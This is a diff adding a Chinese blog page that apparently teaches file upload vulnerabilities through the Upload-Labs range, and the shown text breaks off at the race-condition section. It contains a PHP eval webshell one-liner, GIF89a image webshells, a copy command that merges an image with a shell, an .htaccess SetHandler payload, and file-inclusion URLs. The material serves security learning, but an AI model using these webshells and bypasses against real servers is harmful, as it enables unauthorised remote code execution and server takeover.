@@ -1,0 +1,1127 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chiya-66">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、文件上传的大致定义文件上传功能本身是正常的业务需求（如头像上传），但当开发者未对文件类型、内容、文件名做严格校验时，攻击者就可以上传恶意脚本（如 PHP、JSP、ASP），通过该脚本获取服务器控制权。 核心条件：上传目录可访问 + 文件可被服务器解析。  二、验证文件类型的分类 前端 JS 校验文件后缀名 后端校验： 校验文件后缀名 校验 MIME 类型（HTTP 请求头里的一段文字，告诉服务">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞">
+<meta property="og:url" content="https://chiya-66.github.io/2026/08/10/upload/index.html">
+<meta property="og:site_name" content="Chiya 的博客">
+<meta property="og:description" content="一、文件上传的大致定义文件上传功能本身是正常的业务需求（如头像上传），但当开发者未对文件类型、内容、文件名做严格校验时，攻击者就可以上传恶意脚本（如 PHP、JSP、ASP），通过该脚本获取服务器控制权。 核心条件：上传目录可访问 + 文件可被服务器解析。  二、验证文件类型的分类 前端 JS 校验文件后缀名 后端校验： 校验文件后缀名 校验 MIME 类型（HTTP 请求头里的一段文字，告诉服务">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_upload/media/image1.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_upload/media/image2.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_upload/media/image9.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_upload/media/image10.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_upload/media/image11.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_upload/media/image12.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_upload/media/image13.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_upload/media/image14.jpeg">
+<meta property="og:image" content="https://chiya-66.github.io/images/notes/media_upload/media/image15.jpeg">
+<meta property="article:published_time" content="2026-08-10T06:35:07.000Z">
+<meta property="article:modified_time" content="2026-11-07T10:54:29.368Z">
+<meta property="article:author" content="chiya-66">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://chiya-66.github.io/images/notes/media_upload/media/image1.jpeg">
+  
+  
+  
+  <title>文件上传漏洞 - Chiya 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chiya-66.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Chiya 的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件上传漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-08-10 14:35" pubdate>
+          2026年8月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">文件上传漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一、文件上传的大致定义"><a href="#一、文件上传的大致定义" class="headerlink" title="一、文件上传的大致定义"></a>一、文件上传的大致定义</h2><p>文件上传功能本身是正常的业务需求（如头像上传），但当开发者未对文件类型、内容、文件名做严格校验时，攻击者就可以上传恶意脚本（如 PHP、JSP、ASP），通过该脚本获取服务器控制权。</p>
+<p><strong>核心条件：上传目录可访问 + 文件可被服务器解析。</strong></p>
+<p><img src="/images/notes/media_upload/media/image1.jpeg" srcset="/img/loading.gif" lazyload alt="5f88b850dc95f296b1245a287f912d05"></p>
+<h2 id="二、验证文件类型的分类"><a href="#二、验证文件类型的分类" class="headerlink" title="二、验证文件类型的分类"></a>二、验证文件类型的分类</h2><ol>
+<li><strong>前端 JS 校验文件后缀名</strong></li>
+<li><strong>后端校验</strong>：<ul>
+<li>校验文件后缀名</li>
+<li>校验 MIME 类型（HTTP 请求头里的一段文字，告诉服务器”我传的是什么类型”）</li>
+<li>校验文件头类型（文件本身最开头的一串二进制，代表文件真实类型）</li>
+</ul>
+</li>
+</ol>
+<h2 id="三、文件上传的漏洞分类"><a href="#三、文件上传的漏洞分类" class="headerlink" title="三、文件上传的漏洞分类"></a>三、文件上传的漏洞分类</h2><h3 id="1-前端校验"><a href="#1-前端校验" class="headerlink" title="1. 前端校验"></a>1. 前端校验</h3><h4 id="前端-JS-校验漏洞"><a href="#前端-JS-校验漏洞" class="headerlink" title="前端 JS 校验漏洞"></a>前端 JS 校验漏洞</h4><ul>
+<li><p><strong>防护原理</strong>：仅在浏览器端通过 JS 代码校验文件后缀，后端无任何校验。</p>
+</li>
+<li><p><strong>核心特征</strong>：未点击上传按钮就弹出”不支持该文件类型”提示，抓包后直接放行可上传。</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<ol>
+<li>浏览器禁用 JavaScript：</li>
+</ol>
+<p><img src="/images/notes/media_upload/media/image2.jpeg" srcset="/img/loading.gif" lazyload alt="44722ed4f834216f99c38dde1cff1769"></p>
+<ol start="2">
+<li><p>先上传合法 <code>.jpg</code> 文件，抓包修改后缀为 <code>.php</code>。文件内容直接为一句话木马即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>如果只是打靶场的话，一句话木马也可用 <code>&lt;?php phpinfo(); ?&gt;</code> 代替。</p>
+<blockquote>
+<p><strong>注：</strong></p>
+<ul>
+<li><code>&lt;?php ?&gt;</code>：PHP 的开始标记 + 结束标记</li>
+<li><code>$_POST[&#39;cmd&#39;]</code>：接收通过 POST 传过来、名字叫 <code>cmd</code> 的内容</li>
+<li><code>eval(...)</code>：把传进来的字符串，当成 PHP 代码执行</li>
+<li><code>@</code>：抑制错误，如果代码出错了，不显示报错信息</li>
+</ul>
+</blockquote>
+</li>
+</ol>
+</li>
+<li><p><strong>靶场对应</strong>：Upload-Labs Pass-01</p>
+</li>
+<li><p><strong>备注</strong>：最基础漏洞，新手入门第一关</p>
+</li>
+</ul>
+<h3 id="2-后端校验"><a href="#2-后端校验" class="headerlink" title="2. 后端校验"></a>2. 后端校验</h3><h4 id="MIME-类型校验漏洞"><a href="#MIME-类型校验漏洞" class="headerlink" title="MIME 类型校验漏洞"></a>MIME 类型校验漏洞</h4><ul>
+<li><strong>防护原理</strong>：后端仅校验 HTTP 请求头中的 <code>Content-Type</code> 字段，不校验文件后缀和内容。</li>
+<li><strong>核心特征</strong>：上传 <code>.php</code> 文件被拦截，上传 <code>.jpg</code>&#x2F;<code>.png</code> 正常，抓包可见 <code>Content-Type</code> 字段。</li>
+<li><strong>绕过方法</strong>：抓包修改 <code>Content-Type</code> 为 <code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>。</li>
+<li><strong>靶场对应</strong>：Upload-Labs Pass-02</li>
+<li><strong>备注</strong>：仅校验请求头，极易绕过，实战中较少单独出现。</li>
+</ul>
+<h4 id="后缀黑名单校验漏洞"><a href="#后缀黑名单校验漏洞" class="headerlink" title="后缀黑名单校验漏洞"></a>后缀黑名单校验漏洞</h4><ul>
+<li><p><strong>防护原理</strong>：服务器列出禁止上传的脚本后缀黑名单（如 <code>.php</code>、<code>.asp</code>、<code>.jsp</code>）。</p>
+</li>
+<li><p><strong>核心特征</strong>：提示”禁止上传 php 等脚本文件”，非黑名单后缀可上传。</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>特殊后缀</strong></td>
+<td><code>.php3</code>&#x2F;<code>.php4</code>&#x2F;<code>.php5</code>&#x2F;<code>.phtml</code>（Apache 解析）</td>
+</tr>
+<tr>
+<td><strong>大小写绕过</strong></td>
+<td><code>.pHp</code>&#x2F;<code>.PHP</code>（Windows 环境生效）</td>
+</tr>
+<tr>
+<td><strong>特殊符号</strong></td>
+<td><code>.php </code>（空格）、<code>.php.</code>（末尾点）、<code>.php;jpg</code>、<code>php. .</code></td>
+</tr>
+<tr>
+<td><strong>空字节截断</strong></td>
+<td><code>.php%00.jpg</code>（PHP &lt; 5.3.4），详见下方说明</td>
+</tr>
+<tr>
+<td><strong><code>::$DATA</code> 绕过</strong></td>
+<td>Windows 文件流特性，抓包在后缀后加 <code>::$DATA</code>（建立连接时需删除）</td>
+</tr>
+<tr>
+<td><strong>双写绕过</strong></td>
+<td>有些服务器会将黑名单后缀删除，可使用双写（如 <code>.pphphp</code>）绕过</td>
+</tr>
+</tbody></table>
+<p><strong>%00 截断详解：</strong></p>
+<p><code>%00</code> 是 URL 编码的空字节（null byte，即 0x00）。C 语言以 <code>\0</code> 作为字符串结束符，而 PHP 底层由 C 实现，在 PHP &lt; 5.3.4 版本中，文件操作函数（如 <code>move_uploaded_file</code>）遇到空字节会截断字符串。</p>
+<p>以 <code>shell.php%00.jpg</code> 为例：前端校验看到的是 <code>.jpg</code> 后缀，通过校验；服务端 URL 解码后变为 <code>shell.php\0.jpg</code>，C 函数读取时在 <code>\0</code> 处截断，文件被保存为 <code>shell.php</code>。访问时直接访问 <code>shell.php</code> 即可，<strong>无需手动删除后缀</strong>（截断已在服务端保存时完成）。</p>
+<ul>
+<li><strong>GET 型</strong>：<code>%00</code> 在 URL 参数中，会被服务器自动 URL 解码为空字节。例如 <code>?save_path=../upload/shell.php%00</code>，服务端截断后保存为 <code>shell.php</code>。</li>
+<li><strong>POST 型</strong>：参数在请求体中，直接写入 <code>%00</code> 可能被当作普通字符串，需要用 Burp Suite 的 URL 解码功能将 <code>%00</code> 转换为真实的 0x00 字节，再发送请求。</li>
+</ul>
+<blockquote>
+<p><strong>前提条件</strong>：PHP &lt; 5.3.4，且 magic_quotes_gpc 为关闭状态。</p>
+</blockquote>
+</li>
+<li><p><strong>靶场对应</strong>：Upload-Labs Pass-03&#x2F;05&#x2F;06</p>
+</li>
+<li><p><strong>备注</strong>：最常见的上传漏洞类型，绕过方式最多。</p>
+</li>
+</ul>
+<h4 id="后缀白名单校验漏洞"><a href="#后缀白名单校验漏洞" class="headerlink" title="后缀白名单校验漏洞"></a>后缀白名单校验漏洞</h4><ul>
+<li><p><strong>防护原理</strong>：仅允许指定后缀（如 <code>.jpg</code>&#x2F;<code>.png</code>&#x2F;<code>.gif</code>），其余后缀全部拒绝。</p>
+</li>
+<li><p><strong>核心特征</strong>：只有白名单内文件可上传，脚本后缀一律拦截，防护性较强。</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<p><strong>a. %00 截断</strong></p>
+<p>与黑名单中的 <code>%00</code> 截断原理相同。白名单只校验后缀是否为 <code>.jpg</code>，但通过 <code>%00</code> 截断使服务端实际保存为 <code>.php</code>。例如：<code>shell.php%00.jpg</code>，前端看到 <code>.jpg</code> 通过白名单，服务端截断后保存为 <code>shell.php</code>。</p>
+<blockquote>
+<p>注：白名单场景下 <code>%00</code> 通常出现在<strong>保存路径</strong>参数中（如 <code>save_path=../upload/shell.php%00</code>），而非文件名本身。</p>
+</blockquote>
+<p><strong>b. 路径截断</strong></p>
+<p>在文件路径后添加 <code>/</code> 或 <code>/.</code>，如 <code>shell.php/.</code>。某些情况下系统会将 <code>/</code> 前面当做文件名、后面当做目录，从而将 <code>shell.php</code> 当做可执行脚本。</p>
+<p><strong>c. 配合文件包含漏洞执行图片马</strong></p>
+<p>命名时使用正常图片的命名方式（如 <code>muma.jpg</code>），文件内容则带有 PHP 指令，然后通过文件包含漏洞来激活执行（详见”文件包含漏洞”小节）。</p>
+<p><strong>d. 路径修改</strong></p>
+<p>上传路径就是服务器把上传文件最终”存到哪个文件夹、叫什么名字”的位置。路径可控漏洞则是可以自己改路径，想存到哪儿就存到哪儿，从而把图片修改为 PHP 脚本，最终让服务器去执行木马。</p>
+<p>操作：通过抓包修改第 1 行的路径，使系统通过 <code>.jpg</code> 文件验证的同时将其以 PHP 脚本运行（结合 <code>%00</code> 截断）。</p>
+</li>
+</ul>
+<h4 id="文件头-内容检测漏洞"><a href="#文件头-内容检测漏洞" class="headerlink" title="文件头&#x2F;内容检测漏洞"></a>文件头&#x2F;内容检测漏洞</h4><ul>
+<li><p><strong>防护原理</strong>：检测文件头标识（如 <code>GIF89a</code>、<code>FF D8</code>）或用 <code>getimagesize()</code> 函数校验文件内容是否为真实图片。</p>
+</li>
+<li><p><strong>常用文件头：</strong></p>
+<p><img src="/images/notes/media_upload/media/image9.jpeg" srcset="/img/loading.gif" lazyload alt="6abcfc3f8e9ce1ed83fcab99b816f60b"></p>
+</li>
+<li><p><strong>核心特征</strong>：纯脚本文件上传失败，图片文件可正常上传。</p>
+</li>
+<li><p><strong>绕过方法</strong>：制作<strong>图片马</strong>（在图片文件头部加 <code>GIF89a</code>，末尾插入 PHP 一句话木马）。</p>
+<p><strong>方式一：手动在文件头添加图片标识</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a;<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>方式二：用 <code>copy</code> 命令合并图片与木马（推荐）</strong></p>
+<p>将一句话木马文件（如 <code>info.php</code>）和一张正常图片（如 <code>image.png</code>）放到同一文件夹下，在该文件夹下打开命令行，输入以下指令：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">copy <span class="hljs-selector-tag">image</span><span class="hljs-selector-class">.png</span> /<span class="hljs-selector-tag">b</span> + info<span class="hljs-selector-class">.php</span> /<span class="hljs-selector-tag">a</span> webshell.png<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>指令解析：</strong></p>
+<ul>
+<li><code>image.png</code>：正常图片文件</li>
+<li><code>/b</code>：以二进制（Binary）模式复制，适用于图片等二进制文件</li>
+<li><code>info.php</code>：一句话木马文件</li>
+<li><code>/a</code>：以 ASCII 模式合并，适用于文本文件</li>
+<li><code>webshell.png</code>：合并后的输出文件</li>
+</ul>
+<p>合并后的文件头部是图片数据（通过内容检测），末尾附带 PHP 代码（可被解析执行）。</p>
+</blockquote>
+<p>生成 <code>webshell.png</code> 后上传，再配合文件包含漏洞或解析漏洞执行其中的 PHP 代码。</p>
+</li>
+<li><p><strong>靶场对应</strong>：Upload-Labs Pass-08&#x2F;15</p>
+</li>
+<li><p><strong>备注</strong>：需配合文件包含&#x2F;解析漏洞才能执行木马。</p>
+</li>
+</ul>
+<h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><ul>
+<li><p><strong>原理</strong>：未对包含的文件进行过滤，从而可以随意包含任意一个文件，包括带脚本的木马文件。文件包含函数（如 PHP 的 <code>include</code>、<code>require</code>）会将所包含文件的内容<strong>当作 PHP 代码执行</strong>，因此即使图片马后缀为 <code>.jpg</code>&#x2F;<code>.png</code>，只要被包含就会触发其中的木马代码。</p>
+</li>
+<li><p><strong>利用方法</strong>：首先找到一个可以操作的文件包含点位（靶场中可在根目录创建带木马的文件，实战中则通过 <code>http(s)</code> 协议将木马注入到一个文件中），然后依照路径访问该点位，从而让木马自动运行。</p>
+<p><img src="/images/notes/media_upload/media/image10.jpeg" srcset="/img/loading.gif" lazyload alt="f067686330a32effa4fe15d3441bd697"></p>
+<p><img src="/images/notes/media_upload/media/image11.jpeg" srcset="/img/loading.gif" lazyload alt="80b1755764f3ca64ae61b262a0dddf03"></p>
+</li>
+</ul>
+<h6 id="配合文件包含执行上传的图片马"><a href="#配合文件包含执行上传的图片马" class="headerlink" title="配合文件包含执行上传的图片马"></a>配合文件包含执行上传的图片马</h6><p>上传图片马成功后，图片本身只是被当作普通图片存储，无法直接执行其中的 PHP 代码。此时需要找到一个文件包含漏洞点（通常是带 <code>file</code>、<code>page</code>、<code>path</code> 等参数的 URL），将图片马的路径作为参数传入，让服务端把它当作 PHP 代码包含并执行。</p>
+<p><strong>完整流程：</strong></p>
+<ol>
+<li><p><strong>上传图片马</strong>：按上文方法制作图片马（如 <code>webshell.png</code>）并上传成功，记录上传后的保存路径。</p>
+</li>
+<li><p><strong>确认上传路径</strong>：上传后服务器通常会返回保存路径。注意，很多服务器会对文件<strong>重命名</strong>（如使用时间戳、随机字符串等），例如上传 <code>webshell.png</code> 后实际保存为 <code>1627891234.png</code>，此时需从回显或抓包响应中获取真实文件名。</p>
+</li>
+<li><p><strong>找到文件包含点</strong>：寻找形如 <code>?file=</code>、<code>?page=</code>、<code>?path=</code> 的参数，该参数对应的页面调用了 <code>include</code>&#x2F;<code>require</code> 等文件包含函数。</p>
+</li>
+<li><p><strong>构造利用 URL</strong>：将文件包含参数指向图片马的路径，例如：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">file</span>=upload/webshell.png<br>?<span class="hljs-attribute">file</span>=upload/1627891234.png<br></code></pre></td></tr></table></figure>
+
+<p>服务端执行 <code>include(&#39;upload/webshell.png&#39;)</code> 时，会将图片马中的 PHP 代码解析执行，一句话木马随之生效，即可用蚁剑&#x2F;菜刀连接。</p>
+</li>
+</ol>
+<blockquote>
+<p><strong>注：</strong> 关键在于文件包含函数会忽略文件后缀，直接将内容当作 PHP 代码执行。因此即使文件名为 <code>.png</code>&#x2F;<code>.jpg</code>，只要内容中包含 <code>&lt;?php ?&gt;</code> 标签，就能被包含执行。这也是为什么图片马必须配合文件包含漏洞才能发挥作用。</p>
+</blockquote>
+<h4 id="配置文件解析漏洞"><a href="#配置文件解析漏洞" class="headerlink" title="配置文件解析漏洞"></a>配置文件解析漏洞</h4><ul>
+<li><p><strong>防护原理</strong>：黑名单过滤极严，禁止所有脚本后缀（<code>.php</code>），但允许上传 <code>.htaccess</code>&#x2F;<code>web.config</code> —— Apache&#x2F;IIS 服务器的”局部配置文件”。</p>
+</li>
+<li><p><strong>相关知识点</strong>：配置文件是服务器&#x2F;PHP 的行为规则文件。攻击文件上传，本质就是在利用这些规则的漏洞。</p>
+<p><img src="/images/notes/media_upload/media/image12.jpeg" srcset="/img/loading.gif" lazyload alt="24e0e2069c95959d69e944b72cd528a5"></p>
+<p><img src="/images/notes/media_upload/media/image13.jpeg" srcset="/img/loading.gif" lazyload alt="b3f450a78d2b80c55552a9a2be9072d6"></p>
+<blockquote>
+<p><strong>注：</strong> <code>.htaccess</code> 是 Apache 服务器的分布式配置文件，可以放在网站任意目录下，用来重写 URL、修改 MIME 类型、设置访问权限、解析规则等，相当于给当前目录单独写了一份 Apache 配置。</p>
+</blockquote>
+</li>
+<li><p><strong>核心特征</strong>：所有脚本后缀均被拦截，可上传非脚本格式文件。</p>
+</li>
+<li><p><strong>绕过方法</strong>：</p>
+<p><strong>a. Apache：上传 <code>.htaccess</code>，再传图片马</strong></p>
+<p>先建立一个 <code>.htaccess</code> 文件，内容如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br></code></pre></td></tr></table></figure>
+
+<p>这会将当前目录下所有文件（包括 <code>.jpg</code>、<code>.txt</code> 等）指定为 PHP 方式处理。然后上传图片马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a;<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>保存为 <code>muma.jpg</code> 上传即可。</p>
+<p><strong>b. IIS：上传 <code>web.config</code>，配置 jpg 解析为 asp&#x2F;php</strong></p>
+<p>大致思路和 Apache 一样，先建立 <code>web.config</code> 文件，内容配置 <code>.jpg</code> 解析为 <code>.php</code>，之后再上传图片马文件。</p>
+<p><strong>c. 末尾加点绕过</strong></p>
+<p>直接上传 <code>shell.php</code> 文件，通过抓包在 <code>.php</code> 后面加一个点（<code>shell.php.</code>），Windows 会忽略末尾的点，既能绕过黑名单又能正常作为脚本执行。</p>
+</li>
+<li><p><strong>靶场对应</strong>：Upload-Labs Pass-04&#x2F;07</p>
+</li>
+<li><p><strong>备注</strong>：依赖服务器允许上传配置文件，Apache 环境常用。</p>
+</li>
+</ul>
+<h4 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h4><ul>
+<li><p><strong>防护原理</strong>：服务器先临时保存文件，再校验，不合格则删除，存在时间差。</p>
+<p><img src="/images/notes/media_upload/media/image14.jpeg" srcset="/img/loading.gif" lazyload alt="b66a77a8a0e33aea56fb91ba64ab41ee"></p>
+</li>
